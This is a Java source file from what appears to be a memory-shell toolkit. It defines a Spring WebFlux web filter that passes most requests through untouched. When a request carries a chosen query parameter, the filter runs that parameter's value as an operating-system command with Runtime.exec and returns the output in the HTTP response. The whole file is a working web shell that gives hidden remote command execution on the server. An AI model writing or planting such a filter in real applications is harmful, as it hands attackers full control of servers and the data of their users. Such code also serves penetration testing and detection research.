package com.reajason.javaweb.memshell.springwebflux.command;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandWebFilter extends ClassLoader implements WebFilter {
    public static String paramName;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String cmd = exchange.getRequest().getQueryParams().getFirst(paramName);
        if (cmd == null) {
            return chain.filter(exchange);
        }
        return exchange.getResponse().writeWith(getResult(cmd));
    }

    private Mono<DataBuffer> getResult(String cmd) {
        StringBuilder result = new StringBuilder();
        try {
            Process exec = Runtime.getRuntime().exec(cmd);
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    result.append(line);
                    result.append(System.lineSeparator());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
    }
}
